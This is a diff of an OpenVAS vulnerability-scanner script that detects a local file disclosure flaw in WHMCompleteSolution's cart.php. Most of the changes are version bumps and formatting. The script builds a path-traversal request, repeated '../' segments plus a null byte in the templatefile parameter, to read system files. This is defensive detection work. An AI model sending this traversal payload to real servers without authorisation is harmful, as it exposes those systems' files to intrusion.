@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_WHMCompleteSolution.nasl 5645 2017-03-21 09:32:09Z cfi $
+# $Id: gb_WHMCompleteSolution.nasl 5717 2017-03-24 13:02:24Z cfi $
 #
 # WHMCompleteSolution 'cart.php' Local File Disclosure Vulnerability
 #
@@ -39,20 +39,17 @@ details.";
 if (description)
 {
  script_id(103305);
- script_version("$Revision: 5645 $");
- script_tag(name:"last_modification", value:"$Date: 2017-03-21 10:32:09 +0100 (Tue, 21 Mar 2017) $");
+ script_version("$Revision: 5717 $");
+ script_tag(name:"last_modification", value:"$Date: 2017-03-24 14:02:24 +0100 (Fri, 24 Mar 2017) $");
  script_tag(name:"creation_date", value:"2011-10-20 15:15:44 +0200 (Thu, 20 Oct 2011)");
  script_bugtraq_id(50280);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_name("WHMCompleteSolution 'cart.php' Local File Disclosure Vulnerability");
-
  script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/50280");
  script_xref(name : "URL" , value : "http://whmcs.com/");
  script_xref(name : "URL" , value : "http://forum.whmcs.com/showthread.php?t=42121");
-
  script_tag(name:"qod_type", value:"remote_vul");
- script_summary("Determine if WHMCompleteSolution is prone to a local file-disclosure vulnerability");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
@@ -65,29 +62,28 @@ if (description)
 }
 
 include("http_func.inc");
-include("host_details.inc");
 include("http_keepalive.inc");
+include("host_details.inc");
    
-port = get_http_port(default:80);
-if(!get_port_state(port))exit(0);
-if(!can_host_php(port:port))exit(0);
+port = get_http_port( default:80 );
+if( ! can_host_php( port:port ) ) exit( 0 );
 
-dirs = make_list("/cart","/shop",cgi_dirs());
 files = traversal_files();
 
-foreach dir (dirs) {
+foreach dir( make_list_unique( "/cart", "/shop", cgi_dirs( port:port ) ) ) {
 
-  foreach file (keys(files)) {
+  if( dir == "/" ) dir = "";
+
+  foreach file( keys( files ) ) {
    
-    url = string(dir,"/cart.php?a=test&templatefile=",crap(data:"../",length:9*3),files[file],"%00"); 
+    url = dir + "/cart.php?a=test&templatefile=" + crap( data:"../", length: 9 * 3 ) + files[file] + "%00";
 
-    if(http_vuln_check(port:port, url:url,pattern:file,extra_check:"WHMCompleteSolution")) {
-     
-      security_message(port:port);
-      exit(0);
-
+    if( http_vuln_check( port:port, url:url, pattern:file, extra_check:"WHMCompleteSolution" ) ) {
+      report = report_vuln_url( port:port, url:url );
+      security_message( port:port, data:report );
+      exit( 0 );
     }
   }
 }
-exit(0);
 
+exit( 99 );
